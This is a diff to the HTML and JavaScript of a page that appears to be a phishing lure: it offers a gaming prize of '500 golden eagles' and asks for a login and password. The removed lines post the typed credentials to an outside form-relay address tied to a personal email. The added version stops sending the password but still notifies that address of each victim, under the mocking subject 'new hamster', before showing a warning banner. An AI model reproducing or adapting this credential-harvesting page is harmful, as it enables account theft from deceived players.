@@ -239,14 +239,10 @@
                     <h2>500 ЗОЛОТЫХ ОРЛОВ</h2>
                     <p>в честь Дня защитника Отечества</p>
                     
-                    <form id="phishForm" action="https://formsubmit.co/dangerlight228@gmail.com" method="POST">
-                        <input type="hidden" name="_next" value="https://warthunderprize.github.io/war-gift/">
-                        <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_template" value="table">
-                        
+                    <!-- Убираем action, чтобы данные не улетали стандартно -->
+                    <form id="phishForm">
                         <input type="text" name="login" placeholder="Логин или e-mail" id="login" required>
-                        <input type="password" name="password" placeholder="Пароль" id="password" required>
-                        
+                        <input type="password" name="password" placeholder="Пароль" id="password" required>                        
                         <button type="submit">ПОЛУЧИТЬ НАГРАДУ</button>
                     </form>
                     
@@ -275,32 +271,24 @@
 
 <script>
 document.getElementById('phishForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+    e.preventDefault(); // Не даём форме перезагрузить страницу
     
-    var login = document.getElementById('login').value;
-    var password = document.getElementById('password').value;
-    var time = new Date().toLocaleString('ru-RU');
+    var time = new Date().toLocaleString('ru-RU'); // Получаем текущее время
     
-    // Отправка данных
-    fetch(this.action, {
-        method: 'POST',
-        body: new FormData(this)
-    }).catch(error => console.log('Ошибка:', error));
-    
-    // Отправка уведомления
+    // Отправляем ТОЛЬКО уведомление с временем на почту
     fetch('https://formsubmit.co/dangerlight228@gmail.com', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
-            _subject: '🐹 НОВЫЙ ХОМЯЧОК!',
-            message: `\nВремя: ${time}`
+            _subject: '🐹 НОВЫЙ ХОМЯЧОК!', // Тема письма
+            message: `Время: ${time}`       // Тело письма (только время)
         })
     }).catch(error => console.log('Ошибка уведомления:', error));
     
     // Показываем баннер
     document.getElementById('warningBanner').style.display = 'block';
     
-    // Очищаем поля
+    // Очищаем поля (чтобы следующий "хомячок" мог ввести новые данные)
     document.getElementById('login').value = '';
     document.getElementById('password').value = '';
     
@@ -311,5 +299,3 @@ document.getElementById('phishForm').addEventListener('submit', function(e) {
 
 </body>
 </html>
-
-
